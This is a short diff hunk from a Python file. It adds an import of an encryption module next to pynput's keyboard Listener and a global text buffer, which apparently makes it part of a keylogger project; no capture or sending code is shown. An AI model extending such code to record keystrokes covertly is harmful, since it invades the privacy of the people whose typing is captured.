@@ -8,7 +8,10 @@ import time
 import threading
 import os
 import re
+import chiffrement
 from pynput.keyboard import Key, Listener
+
+
 
 TXT_GLOB = ""
 
